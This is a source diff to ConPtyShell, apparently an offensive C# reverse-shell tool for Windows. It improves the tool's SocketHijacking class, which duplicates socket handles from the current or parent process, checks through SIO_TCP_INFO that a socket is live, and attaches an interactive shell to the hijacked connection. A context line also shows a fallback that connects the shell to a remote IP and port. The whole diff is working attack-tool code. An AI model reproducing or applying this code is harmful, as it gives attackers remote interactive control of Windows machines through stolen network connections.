@@ -4,6 +4,7 @@ using System.Text;
 using System.Threading;
 using System.Net;
 using System.Net.Sockets;
+using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Collections.Generic;
@@ -66,6 +67,7 @@ public static class SocketHijacking {
     private const int WSA_FLAG_OVERLAPPED = 0x1;
     private const int DUPLICATE_SAME_ACCESS = 0x2;
     private const int SystemHandleInformation = 16;
+    private const int SIO_TCP_INFO = unchecked((int)0xD8000027);
 
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
@@ -212,6 +214,30 @@ public static class SocketHijacking {
         public long sin_zero;
     }
 
+    [StructLayout(LayoutKind.Sequential)]
+    private struct TCP_INFO_v0
+    {
+        public TcpState State;
+        public UInt32 Mss;
+        public UInt64 ConnectionTimeMs;
+        public byte TimestampsEnabled;
+        public UInt32 RttUs;
+        public UInt32 MinRttUs;
+        public UInt32 BytesInFlight;
+        public UInt32 Cwnd;
+        public UInt32 SndWnd;
+        public UInt32 RcvWnd;
+        public UInt32 RcvBuf;
+        public UInt64 BytesOut;
+        public UInt64 BytesIn;
+        public UInt32 BytesReordered;
+        public UInt32 BytesRetrans;
+        public UInt32 FastRetrans;
+        public UInt32 DupAcksIn;
+        public UInt32 TimeoutEpisodes;
+        public byte SynRetrans;
+    }
+
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);
 
@@ -226,6 +252,13 @@ public static class SocketHijacking {
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
     private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);
+
+    // WSAIoctl1 implementation specific for SIO_TCP_INFO control code
+    [DllImport("Ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "WSAIoctl")]
+    public static extern int WSAIoctl1(IntPtr s, int dwIoControlCode, ref UInt32 lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, ref int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    private static extern int closesocket(IntPtr s);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
@@ -274,6 +307,7 @@ public static class SocketHijacking {
         return ptrObjectTypesInformation;
     }
 
+    // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h
     private static long AlignUp(long address, long align) {
         return (((address) + (align) - 1) & ~((align) - 1));
     }
@@ -304,7 +338,30 @@ public static class SocketHijacking {
         return TypeIndex;
     }
 
-        //helper method with "dynamic" buffer allocation
+    private static bool IsSocketHijackable(IntPtr socket) {
+        bool ret = false;
+        int result = -1;
+        UInt32 tcpInfoVersion = 0;
+        int bytesReturned = 0;
+        int tcpInfoSize = Marshal.SizeOf(typeof(TCP_INFO_v0));
+        IntPtr tcpInfoPtr = Marshal.AllocHGlobal(tcpInfoSize);
+        result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
+        if (result != 0)
+        {
+            Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
+            ret = false;
+        }
+        else {
+            TCP_INFO_v0 tcpInfoV0 = (TCP_INFO_v0)Marshal.PtrToStructure(tcpInfoPtr, typeof(TCP_INFO_v0));
+            Console.WriteLine("debug: bytes returned " + bytesReturned.ToString() + " Socket handle 0x" + socket.ToString("X4") + " is in tcpstate " + tcpInfoV0.State.ToString() + " total bytes received: " + tcpInfoV0.BytesIn.ToString() + " total bytes sent: " + tcpInfoV0.BytesOut.ToString());
+            if (tcpInfoV0.State == TcpState.SynReceived || tcpInfoV0.State == TcpState.Established)
+                ret = true;
+        }
+        Marshal.FreeHGlobal(tcpInfoPtr);
+        return ret;
+    }
+
+    //helper method with "dynamic" buffer allocation
     public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)
     {
         if (infoLength == 0)
@@ -381,7 +438,7 @@ public static class SocketHijacking {
             {
                 if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
                 { // this will avoids deadlocks on special named pipe handles
-                    // Console.WriteLine("debug: Deadlock detected");
+                    Console.WriteLine("debug: Deadlock detected");
                     CloseHandle(dupHandle);
                     continue;
                 }
@@ -416,8 +473,8 @@ public static class SocketHijacking {
         }
         Marshal.FreeHGlobal(ptrHandlesInfo);
         if (socketsHandles.Count >= 2)
-            // ordering for newer handles we have a higher chance to get the proper socket
-            socketsHandles.Sort(delegate (IntPtr a, IntPtr b) { return (b.ToInt64().CompareTo(a.ToInt64())); });
+            // ordering for older handles we have a higher chance to get the proper socket
+            socketsHandles.Sort(delegate (IntPtr a, IntPtr b) { return (a.ToInt64().CompareTo(b.ToInt64())); });
         return socketsHandles;
     }
 
@@ -438,7 +495,7 @@ public static class SocketHijacking {
                 continue;
             if (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
             {
-                // Console.WriteLine("debug: found inherited socket! handle --> 0x" + parentSocketHandle.ToString("X4"));
+                Console.WriteLine("debug: found inherited socket! handle --> 0x" + parentSocketHandle.ToString("X4"));
                 inherited = true;
                 break;
             }
@@ -448,7 +505,26 @@ public static class SocketHijacking {
             CloseHandle(dupHandle);
         return inherited;
     }
-    
+
+    public static void CountTcpConnections()
+    {
+        IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
+        TcpConnectionInformation[] connections = properties.GetActiveTcpConnections();
+        int establishedConnections = 0;
+
+        foreach (TcpConnectionInformation t in connections)
+        {
+            if (t.State == TcpState.Established)
+            {
+                establishedConnections++;
+            }
+            Console.Write("Local endpoint: {0} ", t.LocalEndPoint.Address);
+            Console.WriteLine("Remote endpoint: {0} ", t.RemoteEndPoint.Address);
+        }
+        Console.WriteLine("There are {0} established TCP connections.",
+           establishedConnections);
+    }
+
     public static IntPtr DuplicateTargetProcessSocket(Process targetProcess)
     {
         IntPtr targetSocketHandle = IntPtr.Zero;
@@ -468,10 +544,15 @@ public static class SocketHijacking {
                 dupSocketHandle = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, WSA_FLAG_OVERLAPPED);
                 if (dupSocketHandle == IntPtr.Zero || dupSocketHandle == new IntPtr(-1))
                     continue;
+                if (!IsSocketHijackable(dupSocketHandle)) {
+                    closesocket(dupSocketHandle);
+                    continue;
+                }
                 targetSocketHandle = dupSocketHandle;
                 break;
             }
         }
+
         // cleaning all socket handles
         foreach (IntPtr dupHandle in targetProcessSockets)
             CloseHandle(dupHandle);
@@ -975,19 +1056,19 @@ public static class ConPtyShell
                 currentProcess = Process.GetCurrentProcess();
                 parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
                 grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
-                socketsHandles = SocketHijacking.GetSocketsTargetProcess(currentProcess);
-                if(socketsHandles.Count > 0){
-                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess);
+                // try to duplicate the socket for the current process
+                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess);
+                if (shellSocket != IntPtr.Zero){
                     if(parentProcess != null)
                         parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
                 }
                 else
+                    // if no sockets are found in the current process we try to hijack our current parent process socket
                     shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess);
-                if(grandParentProcess != null)
+                if(shellSocket == IntPtr.Zero)
+                    throw new ConPtyShellException("No \\Device\\Afd objects found. Socket duplication failed.");
+                if (grandParentProcess != null)
                     grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
-                // cleaning all socket handles duplicated
-                foreach (IntPtr dupHandle in socketsHandles)
-                    CloseHandle(dupHandle);
             }
             else{
                 shellSocket = connectRemote(remoteIp, remotePort);
